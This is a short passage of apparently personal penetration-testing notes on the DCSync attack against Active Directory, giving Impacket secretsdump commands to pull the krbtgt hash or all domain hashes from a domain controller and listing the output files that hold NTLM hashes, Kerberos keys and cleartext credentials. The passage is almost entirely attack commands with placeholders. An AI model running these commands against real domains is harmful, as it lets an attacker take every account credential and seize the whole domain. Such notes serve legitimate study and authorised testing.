#### Attempting DCSync
```shell
secretsdump.py -just-dc-user krbtgt domain.local/<USER>:<PASSWORD>@<TARGET-IP>
```
<img width="1893" height="420" alt="Pasted image 20251230125501" src="https://github.com/user-attachments/assets/10edcf77-e706-43c8-a6c0-b99286c47881" />
## DCSync Attack from Linux (Non-Domain Machine)

```shell
impacket-secretsdump -just-dc-user <TARGET> <domain>/<USER>:<password>@<dc_ip>
```
Using Impacket Python 
```shell
secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
```


```bash
ls domain_hashes*
```

- **Expected Files:**
    - `domain_hashes.ntds` – Contains NTLM hashes.
    - `domain_hashes.ntds.kerberos` – Contains Kerberos keys.
    - `domain_hashes.ntds.cleartext` – Contains any cleartext credentials (if reversible encryption is enabled).

